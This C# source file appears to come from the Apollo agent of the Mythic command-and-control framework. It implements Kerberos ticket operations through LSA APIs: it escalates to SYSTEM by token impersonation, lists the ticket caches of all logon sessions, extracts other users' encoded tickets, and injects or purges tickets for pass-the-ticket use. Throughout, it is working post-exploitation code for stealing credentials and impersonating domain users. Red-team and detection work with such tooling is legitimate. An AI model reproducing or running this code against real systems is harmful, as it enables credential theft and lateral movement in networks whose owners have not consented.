using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using ApolloInterop.Enums;
using ApolloInterop.Features.KerberosTickets;
using ApolloInterop.Features.WindowsTypesAndAPIs;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
//using Asn1;
using static ApolloInterop.Features.WindowsTypesAndAPIs.APIInteropTypes;
using static ApolloInterop.Features.WindowsTypesAndAPIs.LSATypes;
using static ApolloInterop.Features.WindowsTypesAndAPIs.WinNTTypes;
using static KerberosTickets.KerberosTicketManager;

namespace KerberosTickets;

internal static class KerberosHelpers
{
    private static HANDLE systemHandle { get; set; }
    //private helper methods
    private static HANDLE GetLsaHandleUntrusted(bool elevateToSystem = true)
    {
        HANDLE lsaHandle = new();
        try
        {
            bool elevated = false;
            IntPtr _systemHandle = new();
            DebugHelp.DebugWriteLine("Getting LSA Handle");
            //if we are already high integrity, we need to elevate to system to get the handle to all the sessions
            if(Agent.GetIdentityManager().GetIntegrityLevel() is IntegrityLevel.HighIntegrity && elevateToSystem)
            {
                //if we have a system handle already, we can use that
                if(systemHandle.IsNull is false)
                {
                    _systemHandle = systemHandle;
                    elevated = true;
                }
                else
                {
                    (elevated, _systemHandle) = Agent.GetIdentityManager().GetSystem();
                }
                if (elevated)
                {
                    systemHandle = new();
                    var originalUser =  WindowsIdentity.Impersonate(_systemHandle);
                    WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
                    originalUser.Undo();
                }
                else
                {
                    DebugHelp.DebugWriteLine("Failed to elevate to system");
                }
            }
            else
            {
                //if we are not high integrity, we can just get the handle to our own session, and if we happen to be system already, we can get all sessions
                WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
            }
        }
        catch (Exception e)
        {
            DebugHelp.DebugWriteLine($"Error getting LSA Handle: {e.Message}");
        }
        return lsaHandle;
    }

    private static uint GetAuthPackage(HANDLE lsaHandle, HANDLE<LSA_IN_STRING> packageNameHandle)
    {
        NTSTATUS lsaLookupStatus = WindowsAPI.LsaLookupAuthenticationPackageDelegate(lsaHandle, packageNameHandle, out uint authPackage);
        if (lsaLookupStatus != NTSTATUS.STATUS_SUCCESS)
        {
            DebugHelp.DebugWriteLine($"Failed package lookup with error: {lsaLookupStatus}");
            return 0;
        }
        return authPackage;
    }

    

    private static IEnumerable<LUID> GetLogonSessions()
    {
        List<LUID> logonIds = [];
        try
        {
            if (Agent.GetIdentityManager().GetIntegrityLevel() >= IntegrityLevel.HighIntegrity)
            {
                // get all logon ids
                DebugHelp.DebugWriteLine("enumerating logon session");
                WindowsAPI.LsaEnumerateLogonSessionsDelegate(out uint logonCount, out HANDLE logonIdHandle);
                var logonWorkingHandle = logonIdHandle;
                for (var i = 0; i < logonCount; i++)
                {
                    var logonId = logonWorkingHandle.CastTo<LUID>();
                    if (logonId.IsNull || logonIds.Contains(logonId))
                    {
                        DebugHelp.DebugWriteLine("LogonId is null or is already in the list, skipping");
                        continue;
                    }
                    logonIds.Add(logonId);
                    logonWorkingHandle = logonWorkingHandle.Increment();
                }
                WindowsAPI.LsaFreeReturnBufferDelegate(logonIdHandle);
            }
            else
            {
                // we can only get our own if not elevated
                logonIds.Add(GetCurrentLuid());
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
            Marshal.GetLastWin32Error();
        }
        return logonIds;
    }

    private static LogonSessionData GetLogonSessionData(HANDLE<LUID> luidHandle)
    {
        HANDLE logonSessionDataHandle = new();
        try
        {
            WindowsAPI.LsaGetLogonSessionDataDelegate(luidHandle, out logonSessionDataHandle);
            var seclogonSessionData = logonSessionDataHandle.CastTo<SECURITY_LOGON_SESSION_DATA>();
            LogonSessionData sessionData = new()
            {
                LogonId = seclogonSessionData.LogonId,
                Username = seclogonSessionData.UserName.ToString(),
                LogonDomain = seclogonSessionData.LogonDomain.ToString(),
                AuthenticationPackage = seclogonSessionData.AuthenticationPackage.ToString(),
                LogonType = (Win32.LogonType)seclogonSessionData.LogonType,
                Session = (int)seclogonSessionData.Session,
                Sid = seclogonSessionData.Sid.IsNull ? null :  new SecurityIdentifier(seclogonSessionData.Sid),
                LogonTime = DateTime.FromFileTime(seclogonSessionData.LogonTime),
                LogonServer = seclogonSessionData.LogonServer.ToString(),
                DnsDomainName = seclogonSessionData.DnsDomainName.ToString(),
                Upn = seclogonSessionData.Upn.ToString()
            };
            return sessionData;
        }
        catch (Exception e)
        {
            DebugHelp.DebugWriteLine($"Error getting logon session data: {e.Message}");
            return new LogonSessionData();
        }
        finally
        {
            WindowsAPI.LsaFreeReturnBufferDelegate(logonSessionDataHandle);
        }
    }
    
    private static IEnumerable<KerberosTicket> GetTicketCache(HANDLE lsaHandle, uint authPackage, LUID logonId)
    {
        //needs to be elevated to pass in a logon id so if we arent we wipe the value here
        LUID UsedlogonId = logonId;
        if (Agent.GetIdentityManager().GetIntegrityLevel() <= IntegrityLevel.MediumIntegrity)
        {
            UsedlogonId = new LUID();
        }
        // tickets to return
        List<KerberosTicket> tickets = [];
        
        KERB_QUERY_TKT_CACHE_REQUEST request = new()
        {
            MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage,
            LogonId = UsedlogonId
        };
        HANDLE<KERB_QUERY_TKT_CACHE_REQUEST> requestHandle = new(request);

        var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestHandle, Marshal.SizeOf(request), out HANDLE returnBuffer,  out uint returnLength, out NTSTATUS returnStatus);

        if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
        {
            DebugHelp.DebugWriteLine($"Failed to get ticket cache with error: {status} and return status: {returnStatus}");
            DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
            return tickets;
        }
        var response = returnBuffer.CastTo<KERB_QUERY_TKT_CACHE_RESPONSE>();
        
        if (response.CountOfTickets == 0)
        {
            DebugHelp.DebugWriteLine("No tickets found");
            WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
            return tickets;
        }

        //required because the first ticket is not at the start of the buffer, but at a pointer size away from the start, so without this we read invalid memory
        HANDLE<KERB_TICKET_CACHE_INFO_EX> ticketHandle = (HANDLE<KERB_TICKET_CACHE_INFO_EX>)returnBuffer.Increment();
        // loop over every ticket
        for (var i = 0; i < response.CountOfTickets; i++)
        {
            // get the ticket
            var lpTicket = ticketHandle.GetValue();
            var foundTicket = new KerberosTicket
            {
                Luid = logonId,
                ClientName = lpTicket.ClientName.ToString(),
                ClientRealm = lpTicket.ClientRealm.ToString(),
                ServerName = lpTicket.ServerName.ToString(),
                ServerRealm = lpTicket.ServerRealm.ToString(),
                StartTime = DateTime.FromFileTime(lpTicket.StartTime),
                EndTime = DateTime.FromFileTime(lpTicket.EndTime),
                RenewTime = DateTime.FromFileTime(lpTicket.RenewTime),
                EncryptionType = (KerbEncType)lpTicket.EncryptionType,
                TicketFlags = (KerbTicketFlags)lpTicket.TicketFlags
            };
            DebugHelp.DebugWriteLine($"Ticket {i} Info: {foundTicket.ToString().ToIndentedString()}");
            tickets.Add(foundTicket);
            ticketHandle = ticketHandle.IncrementBy(Marshal.SizeOf<KERB_TICKET_CACHE_INFO_EX>());
        }
        WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
        return tickets;
    }

    private static (HANDLE, uint, IEnumerable<LUID>) InitKerberosConnectionAndSessionInfo(bool GetSessions = true)
    {
        ValueTuple<HANDLE, uint, IEnumerable<LUID>> connectionInfo = new(new(), 0, []);
        HANDLE lsaHandle = new();
        try
        {
            //get lsa handle
            lsaHandle = GetLsaHandleUntrusted();
            if (lsaHandle.IsNull)
            {
                DebugHelp.DebugWriteLine("Failed to get LSA Handle");
                DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
                return connectionInfo;
            }
            DebugHelp.DebugWriteLine("Got LSA Handle");
            connectionInfo.Item1 = lsaHandle;
            
            // get auth package
            LSA_IN_STRING packageName = new("kerberos");
            HANDLE<LSA_IN_STRING> packageNameHandle = new(packageName);
            DebugHelp.DebugWriteLine("Getting Auth Package");
            uint authPackage = GetAuthPackage(lsaHandle, packageNameHandle);
            if (authPackage == 0)
            {
                DebugHelp.DebugWriteLine("Failed to get Auth Package");
                DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
                return connectionInfo;
            }
            DebugHelp.DebugWriteLine($"Got Auth Package {packageName}");
            connectionInfo.Item2 = authPackage;

            // get all logon sessions
            if (GetSessions)
            {
                DebugHelp.DebugWriteLine("Getting Logon Sessions");
                var logonSessions = GetLogonSessions();
                var logonSessionList = logonSessions.ToList();
                DebugHelp.DebugWriteLine($"Found {logonSessionList.Count()} logon sessions");
                connectionInfo.Item3 = logonSessionList;
            }
        }
        catch (Exception ex)
        {
            DebugHelp.DebugWriteLine($"Error triaging tickets: {ex.Message}");
            DebugHelp.DebugWriteLine(ex.StackTrace);
            DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
            return connectionInfo;
        }
        return connectionInfo;
    }
    
    
    //internal methods but are exposed via the KerberosTicketManager
    internal static LUID GetCurrentLuid()
    {
        //get size of the Token_statistics struct
        int tokenInfoSize = Marshal.SizeOf<TOKEN_STATISTICS>();
        //allocate memory for the token statistics struct
        HANDLE tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
        //get the token statistics struct
        HANDLE primaryToken = (HANDLE)Agent.GetIdentityManager().GetCurrentPrimaryIdentity().Token;
        bool success = WindowsAPI.GetTokenInformationDelegate(primaryToken, Win32.TokenInformationClass.TokenStatistics, tokenInfo, tokenInfoSize, out int returnLength);
        if (success)
        {
            TOKEN_STATISTICS tokenStats = tokenInfo.CastTo<TOKEN_STATISTICS>();
            return tokenStats.AuthenticationId;
        }
        return new LUID();
    }
    
    internal static LUID GetTargetProcessLuid(int pid)
    {
        HANDLE tokenInfo = new();
        HANDLE targetProcessHandle = new();
        HANDLE targetProcessTokenHandle = new();
        try
        {
            DebugHelp.DebugWriteLine($"Getting LUID for process {pid}");
            targetProcessHandle = WindowsAPI.OpenProcessDelegate(Win32.ProcessAccessFlags.MAXIMUM_ALLOWED, false, pid);
            if (targetProcessHandle.IsNull)
            {
                DebugHelp.DebugWriteLine($"Failed to get handle for process {pid}");
                return new LUID();
            }
            if(WindowsAPI.OpenProcessTokenDelegate(targetProcessHandle, TokenAccessLevels.Query, out targetProcessTokenHandle) is false)
            {
                DebugHelp.DebugWriteLine($"Failed to get token handle for process {pid}");
                return new LUID();
            }
            //get size of the Token_statistics struct
            int tokenInfoSize = Marshal.SizeOf<TOKEN_STATISTICS>();
            //allocate memory for the token statistics struct
            tokenInfo = (HANDLE)Marshal.AllocHGlobal(tokenInfoSize);
            //get the token statistics struct
            bool success = WindowsAPI.GetTokenInformationDelegate(targetProcessTokenHandle, Win32.TokenInformationClass.TokenStatistics, tokenInfo, tokenInfoSize, out int returnLength);
            if (success)
            {
                TOKEN_STATISTICS tokenStats = tokenInfo.CastTo<TOKEN_STATISTICS>();
                DebugHelp.DebugWriteLine($"Got LUID for process {pid}");
                return tokenStats.AuthenticationId;
            }
            DebugHelp.DebugWriteLine($"Failed to get LUID for process {pid} during get token info call");
            DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
            return new LUID();
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
            return new LUID();
        }
        finally
        {
            Marshal.FreeHGlobal(tokenInfo);
            WindowsAPI.CloseHandleDelegate(targetProcessTokenHandle);
            WindowsAPI.CloseHandleDelegate(targetProcessHandle);
        }
    }
    
    //get all tickets
    internal static IEnumerable<KerberosTicket> TriageTickets(bool getSystemTickets = false, string targetLuid = "")
    {
        List<KerberosTicket> allTickets = [];
        DebugHelp.DebugWriteLine("Starting to triage tickets from LSA");
        (HANDLE lsaHandle, uint authPackage, IEnumerable<LUID> logonSessions) =  InitKerberosConnectionAndSessionInfo();
        try
        {
            if(lsaHandle.IsNull || authPackage == 0 || !logonSessions.Any())
            {
                DebugHelp.DebugWriteLine("Failed to get connection info");
                return allTickets;
            }
            // get tickets from each session
            foreach (var logonSession in logonSessions)
            {
                //if a target LUID is provided, skip any that do not match
                if(!string.IsNullOrWhiteSpace(targetLuid) && logonSession.ToString() != targetLuid)
                {
                    continue;
                }
                var sessionData = GetLogonSessionData(new(logonSession));
                //should skip any non-user accounts by checking the session id
                if (getSystemTickets is false && sessionData.Session is 0)
                {
                    continue;
                }
                var tickets = GetTicketCache(lsaHandle, authPackage, logonSession);
                allTickets.AddRange(tickets);
            }
        }
        catch (Exception ex)
        {
            DebugHelp.DebugWriteLine($"Error triaging tickets: {ex.Message}");
            DebugHelp.DebugWriteLine(ex.StackTrace);
            DebugHelp.DebugWriteLine($"{Marshal.GetLastWin32Error()}");
        }
        finally
        {
            // close lsa handle
            WindowsAPI.LsaDeregisterLogonProcessDelegate(lsaHandle);
        }
        return allTickets;
    }
    
    
    //extract ticket
    internal static KerberosTicket? ExtractTicket(LUID targetLuid, string targetName)
    {
        try
        {
            targetName = targetName.Trim();
            //needs to be elevated to pass in a logon id so if we aren't we wipe the value here
            //Discarding the logonSessions because we do not need them so we pass false to prevent enumerating them
            (HANDLE lsaHandle, uint authPackage, IEnumerable<LUID> _) =  InitKerberosConnectionAndSessionInfo(false);
            //if we are not an admin user then we cannot send a real lUID so we need to send a null one
            if(Agent.GetIdentityManager().GetIntegrityLevel() is <= IntegrityLevel.MediumIntegrity)
            {
                DebugHelp.DebugWriteLine("Not high integrity, setting targetLuid to null");
                targetLuid = new LUID();
            }
            DebugHelp.DebugWriteLine($"Enumerating ticket for {targetName}");
            var ticket = GetTicketCache(lsaHandle, authPackage, targetLuid).FirstOrDefault(x => x.ServerName.Contains(targetName));
            if(ticket is null)
            {
                DebugHelp.DebugWriteLine($"Failed to find ticket for {targetName}");
                return null;
            }
            
            KERB_RETRIEVE_TKT_REQUEST request = new()
            {
                MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage,
                LogonId = targetLuid,
                TargetName = new(ticket.ServerName),
                TicketFlags = 0,
                CacheOptions = KerbCacheOptions.KERB_RETRIEVE_TICKET_AS_KERB_CRED,
                EncryptionType = 0
            };
            // LsaCallAuthenticationPackage requires the target name is added to the end of the struct
            // need to allocate memory for the struct and the target name
            var requestSize = Marshal.SizeOf<KERB_RETRIEVE_TKT_REQUEST>();
            var targetNameSize = request.TargetName.MaximumLength;
            var requestPlusNameSize = requestSize + targetNameSize;
            HANDLE requestAndNameHandle = new(Marshal.AllocHGlobal(requestPlusNameSize));
            //write the request to the start of the new memory block
            Marshal.StructureToPtr(request, requestAndNameHandle, false);
            //get the address of the end of the struct
            HANDLE requestEndAddress = new(new(requestAndNameHandle.PtrLocation.ToInt64() + requestSize));
            //write the target name to the end of the struct
            WindowsAPI.RtlMoveMemoryDelegate(requestEndAddress, request.TargetName.Buffer, targetNameSize);
            // ugh microsoft, why do you do this to me :(
            //so the address inside the struct needs to be updated to the new address of the target name now that its written to the end of the request data, so we write that address value as the address to read the target name from
            Marshal.WriteIntPtr(requestAndNameHandle, IntPtr.Size == 8 ? 24 : 16, requestEndAddress);
            //get the ticket
            var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestAndNameHandle, requestPlusNameSize, out HANDLE returnBuffer,  out uint returnLength, out NTSTATUS returnStatus);

            if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
            {
                DebugHelp.DebugWriteLine($"Failed to extract ticket with error: {status} and return status: {returnStatus}");
                return null;
            }
            //convert the location of the ticket in memory to a struct
            var response = returnBuffer.CastTo<KERB_RETRIEVE_TKT_RESPONSE>();
            
            //make sure the ticket has some data 
            if (response.Ticket.EncodedTicketSize == 0)
            {
                DebugHelp.DebugWriteLine("No ticket Data to extract");
                WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
                return null;
            }
            //copy the ticket data to a byte array
            ticket.Kirbi = new byte[response.Ticket.EncodedTicketSize];
            Marshal.Copy(response.Ticket.EncodedTicket, ticket.Kirbi, 0, (int)response.Ticket.EncodedTicketSize);
            WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
            return ticket;
        }
        catch (Exception e)
        {
            return null;
        }
    }
    
    // load ticket 
    internal static bool LoadTicket(byte[] submittedTicket, LUID targetLuid)
    {
        HANDLE requestAndTicketHandle = new();
        HANDLE lsaHandle = new();
        HANDLE returnBuffer = new();
        try
        {
            //needs to be elevated to pass in a logon id so if we aren't we wipe the value here
            //Discarding the logonSessions because we do not need them so we pass false to prevent enumerating them
            (lsaHandle, uint authPackage, IEnumerable<LUID> _) = InitKerberosConnectionAndSessionInfo(false);
            //if we are not an admin user then we cannot send a real lUID so we need to send a null one
            if (Agent.GetIdentityManager().GetIntegrityLevel() is <= IntegrityLevel.MediumIntegrity)
            {
                DebugHelp.DebugWriteLine("Not high integrity, setting targetLuid to 0");
                targetLuid = new LUID();
            }
            //get the size of the request structure
            var requestSize = Marshal.SizeOf<KERB_SUBMIT_TKT_REQUEST>();

            KERB_SUBMIT_TKT_REQUEST request = new()
            {
                MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage,
                LogonId = targetLuid,
                KerbCredSize = submittedTicket.Length,
                KerbCredOffset = requestSize,
            };
            
            //get the size of the required parts and allocate memory for the struct and the ticket
            var ticketSize = submittedTicket.Length;
            DebugHelp.DebugWriteLine($"Ticket is of size {ticketSize}");
            var requestPlusTicketSize = requestSize + ticketSize;
            DebugHelp.DebugWriteLine($"Allocating memory for request and ticket of size {requestPlusTicketSize}");
            requestAndTicketHandle = new(Marshal.AllocHGlobal(requestPlusTicketSize));
            
            //write the request to the start of the new memory block
            Marshal.StructureToPtr(request, requestAndTicketHandle, false);
            //get the address of the end of the struct
            HANDLE requestEndAddress = new(new(requestAndTicketHandle.PtrLocation.ToInt64() + requestSize));
            //write the ticket to the end of the struct
            Marshal.Copy(submittedTicket, 0, requestEndAddress.PtrLocation, ticketSize);
            
            //submit the ticket
            DebugHelp.DebugWriteLine($"Submitting ticket of size {ticketSize} to LSA");
            var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestAndTicketHandle, requestPlusTicketSize, out returnBuffer, out uint returnLength, out NTSTATUS returnStatus);

            if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
            {
                DebugHelp.DebugWriteLine($"Failed to submit ticket with api status: {status} and return status: {returnStatus}");
                return false;
            }
            DebugHelp.DebugWriteLine("Ticket submitted");
            return true;
        }
        catch (Exception e)
        {
            return false;
        }
        finally
        {
            Marshal.FreeHGlobal(requestAndTicketHandle.PtrLocation);
            WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
            WindowsAPI.LsaDeregisterLogonProcessDelegate(lsaHandle);
        }
    }
    
    // unload ticket
    internal static bool UnloadTicket(byte[] submittedTicket, LUID targetLuid, bool All)
    {
        HANDLE requestAndTicketHandle = new();
        HANDLE lsaHandle = new();
        HANDLE returnBuffer = new();
        try
        {
            //needs to be elevated to pass in a logon id so if we aren't we wipe the value here
            //Discarding the logonSessions because we do not need them so we pass false to prevent enumerating them
            (lsaHandle, uint authPackage, IEnumerable<LUID> _) = InitKerberosConnectionAndSessionInfo(false);
            //if we are not an admin user then we cannot send a real lUID so we need to send a null one
            if (Agent.GetIdentityManager().GetIntegrityLevel() is <= IntegrityLevel.MediumIntegrity)
            {
                DebugHelp.DebugWriteLine("Not high integrity, setting targetLuid to null");
                targetLuid = new LUID();
            }

            //get the size of the request structure
            var requestSize = Marshal.SizeOf<KERB_PURGE_TKT_CACHE_REQUEST>();

            KERB_PURGE_TKT_CACHE_REQUEST request = new()
            {
                MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage,
                LogonId = targetLuid,
                ServerName = new(""),
                RealmName = new("")
            };
            
            if (All is false)
            {
                string servername = "";
                string realmname = "";
                //try to get the ticket from the store but if that fais we can get its info from the system
                string base64Ticket = Convert.ToBase64String(submittedTicket);
                var ticket = Agent.GetTicketManager().GetTicketsFromTicketStore().FirstOrDefault(x => x.base64Ticket == base64Ticket);
                if (ticket is not null)
                {
                    servername = ticket.ServiceFullName.Split('@')[0];
                    realmname = ticket.ServiceFullName.Split('@')[1];
                }
                else
                {
                    //if we cannot get the ticket from the store we can try to get the servername and realm from the ticket itself
                    var extractedTicket = ExtractTicket(targetLuid, "");
                    if (extractedTicket is not null)
                    {
                        servername = extractedTicket.ServerName;
                        realmname = extractedTicket.ServerRealm;
                    }
                }
                //update the request with the specific target info
                if(String.IsNullOrWhiteSpace(servername) || String.IsNullOrWhiteSpace(realmname))
                {
                    //return here so we dont risk wiping the wrong tickets
                    DebugHelp.DebugWriteLine("Failed to get servername or realmname from ticket");
                    return false;
                }
                request.ServerName = new(servername);
                request.RealmName = new(realmname);
            }
                


            HANDLE<KERB_PURGE_TKT_CACHE_REQUEST> requestHandle = new(request);
            
            //submit the ticket
            var status = WindowsAPI.LsaCallAuthenticationPackageDelegate(lsaHandle, authPackage, requestHandle, requestSize, out returnBuffer, out uint returnLength, out NTSTATUS returnStatus);

            if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
            {
                DebugHelp.DebugWriteLine($"Failed to extract ticket with error: {status} and return status: {returnStatus}");
                return false;
            }
            return true;
        }
        catch (Exception e)
        {
            return false;
        }
        finally
        {
            Marshal.FreeHGlobal(requestAndTicketHandle.PtrLocation);
            WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
            WindowsAPI.LsaDeregisterLogonProcessDelegate(lsaHandle);
        }
    }
}